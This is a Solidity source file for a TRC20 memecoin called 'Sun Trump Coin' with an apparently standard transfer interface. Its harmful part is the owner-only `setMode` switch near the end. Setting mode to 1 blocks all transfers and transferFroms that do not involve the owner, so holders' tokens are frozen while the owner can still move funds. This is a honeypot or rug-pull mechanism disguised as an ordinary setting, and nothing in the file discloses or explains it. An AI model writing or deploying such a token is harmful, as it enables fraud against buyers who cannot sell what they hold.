// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SunTrumpCoin is ITRC20 {
    string public constant name = "Sun Trump Coin";
    string public constant symbol = "STC";
    uint8 public constant decimals = 6;
    uint256 private _totalSupply = 1_000_000_000 * 10**uint256(decimals);

    address public owner;
    uint8 public mode = 0;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowed;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier modeAllowed(address sender, address recipient) {
        if (mode == 1) {
            require(sender == owner || recipient == owner, "Transfers restricted");
        }
        _;
    }

    constructor() {
        owner = msg.sender;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public override modeAllowed(msg.sender, recipient) returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view override returns (uint256) {
        return allowed[owner_][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override modeAllowed(sender, recipient) returns (bool) {
        require(balances[sender] >= amount, "Insufficient balance");
        require(allowed[sender][msg.sender] >= amount, "Allowance exceeded");
        balances[sender] -= amount;
        balances[recipient] += amount;
        allowed[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setMode(uint8 _mode) public onlyOwner {
        mode = _mode;
    }
}
